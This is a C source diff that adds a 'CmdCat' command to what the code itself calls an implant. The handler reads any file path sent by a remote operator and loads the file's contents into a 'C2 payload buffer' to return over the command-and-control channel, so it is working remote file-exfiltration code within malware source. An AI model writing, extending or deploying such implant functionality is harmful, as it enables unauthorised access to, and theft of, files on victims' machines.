@@ -643,6 +643,92 @@ cleanup:
 	return status;
 }
 
+DWORD CmdCat(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR filePath = NULL;
+	HANDLE hFile = INVALID_HANDLE_VALUE;
+	PBYTE responseBuffer = NULL;
+	DWORD fileSize = 0;
+	DWORD bytesRead = 0;
+
+	if (responseData != NULL) *responseData = NULL;
+	if (responseLen != NULL) *responseLen = 0;
+
+	// convert operator input (the file path) to a wide string
+	status = ConvertUtf8ToWideString(dataLen, data, &filePath);
+	if (status != NO_ERROR) {
+		return status;
+	}
+
+	// open the file for reading
+	hFile = CreateFileW(
+		filePath,
+		GENERIC_READ,          // Read-only access
+		FILE_SHARE_READ,       // Let other programs read it while we have it open
+		NULL,
+		OPEN_EXISTING,         // Only open if it actually exists
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+
+	if (hFile == INVALID_HANDLE_VALUE) {
+		status = GetLastError();
+		goto cleanup;
+	}
+
+	// get the exact file size
+	fileSize = GetFileSize(hFile, NULL);
+	if (fileSize == INVALID_FILE_SIZE) {
+		status = GetLastError();
+		goto cleanup;
+	}
+
+	// edge case: If the file is completely empty, just return success with 0 bytes
+	if (fileSize == 0) {
+		goto cleanup;
+	}
+
+	// allocate the C2 payload buffer to fit the exact file size
+	responseBuffer = (PBYTE)ImplantHeapAlloc(fileSize);
+	if (responseBuffer == NULL) {
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// read the file directly into our C2 buffer
+	if (!ReadFile(hFile, responseBuffer, fileSize, &bytesRead, NULL)) {
+		status = GetLastError();
+		goto cleanup;
+	}
+
+	// assign output pointers
+	*responseData = responseBuffer;
+	*responseLen = bytesRead;
+
+cleanup:
+	if (hFile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hFile);
+	}
+	if (filePath != NULL) {
+		ImplantHeapFree(filePath);
+	}
+
+	// if anything failed, clean up the main C2 buffer to prevent memory leaks
+	if (status != NO_ERROR && responseBuffer != NULL) {
+		ImplantHeapFree(responseBuffer);
+		if (responseData != NULL) *responseData = NULL;
+		if (responseLen != NULL) *responseLen = 0;
+	}
+
+	return status;
+}
+
 DWORD ExecuteCommandById(
 	DWORD cmdId,
 	DWORD dataLen,
